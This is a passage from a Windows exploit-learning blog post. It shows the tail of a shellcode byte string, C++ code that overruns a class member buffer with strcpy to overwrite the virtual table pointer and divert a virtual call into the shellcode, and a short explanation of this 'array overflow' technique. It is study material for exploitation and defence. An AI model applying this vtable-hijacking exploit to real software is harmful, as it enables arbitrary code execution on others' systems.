</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\x68\x6B\x61\x6F\x6F\x68\x4D\x69\x73\x61\x8B\xC4\x53\x50\x50</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\xAC\xBA\x40\x00</span><span class=s>&#34;</span><span class=p>;</span> <span class=c1>// set fake virtual function pointer
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Failwest</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>public</span><span class=o>:</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>200</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>virtual</span> <span class=kt>void</span> <span class=nf>test</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Class Vtable::test()&#34;</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Failwest</span> <span class=n>overflow</span><span class=p>,</span> <span class=o>*</span><span class=n>p</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span> <span class=n>p_vtable</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>p_vtable</span> <span class=o>=</span> <span class=n>overflow</span><span class=p>.</span><span class=n>buf</span> <span class=o>-</span> <span class=mi>4</span><span class=p>;</span> <span class=c1>// point to virtual table
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>cout</span> <span class=o>&lt;&lt;</span> <span class=s>&#34;Buf Address:&#34;</span> <span class=o>&lt;&lt;</span> <span class=o>&amp;</span><span class=n>overflow</span><span class=p>.</span><span class=n>buf</span> <span class=o>&lt;&lt;</span> <span class=n>endl</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=c1>// reset fake virtual table to 0x0040BB5C
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=c1>// the address may need to ajusted via runtime debug
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>p_vtable</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x5C</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>p_vtable</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0xBB</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>p_vtable</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x40</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>p_vtable</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=mh>0x00</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>strcpy</span><span class=p>(</span><span class=n>overflow</span><span class=p>.</span><span class=n>buf</span><span class=p>,</span><span class=n>shellcode</span><span class=p>);</span> <span class=c1>// set fake virtual function pointer
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>p</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>overflow</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>p</span><span class=o>-&gt;</span><span class=n>test</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=description>Description</h3><ul><li>The dummy table pointer is located before the member variable <code>char buf[200]</code>, the program locates this pointer by <code>p_vtable = overflow.buf - 4</code></li><li>Modify the virtual table to point to the buffer <code>0x0040BB5C</code>, this is the end of the shellcode, fill in <code>0x0040BAAC</code> which is the starting address of the shellcode, the program will jump to execute the shellcode</li><li>This way is neither stack overflow nor heap overflow, because the memory space of the object is located in the heap, but it is a continuous linear overwrite space, so it should be accurately called &ldquo;array overflow&rdquo; or &ldquo;continuous overwrite&rdquo;</li><li>It may be easier to attack the virtual table using DWORD SHOOT</li></ul></section><footer class=article-footer><section class=article-tags><a href=/tags/windows/>Windows</a>
<a href=/tags/exceptionhandling/>ExceptionHandling</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/posts/exploit-learning-notes-008-windows-exception-exploitation/><div class=article-details><h2 class=article-title>Exploit Learning Notes 008 Windows Exception Exploitation</h2></div></a></article><article><a href=/posts/exploit-learning-notes-021-protected-heap/><div class=article-details><h2 class=article-title>Exploit learning notes 021 Protected HEAP</h2></div></a></article><article><a href=/posts/exploit-learning-notes-020-sehop-introduction/><div class=article-details><h2 class=article-title>Exploit learning notes 020 SEHOP introduction</h2></div></a></article><article><a href=/posts/exploit-learning-notes-019-using-heapspray-attack-aslr/><div class=article-details><h2 class=article-title>Exploit learning notes 019 Using HeapSpray Attack ASLR</h2></div></a></article><article><a href=/posts/exploit-learning-notes-018-using-partial-overlay-location/><div class=article-details><h2 class=article-title>Exploit learning notes 018 using partial overlay location</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=Moeomu/blog data-repo-id=R_kgDOHHJl4A data-category=Announcements data-category-id=DIC_kwDOHHJl4M4CR7uM data-mapping=pathname data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en crossorigin=anonymous async></script>
<script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2023 Misaka's Secrect Garden</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.21.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>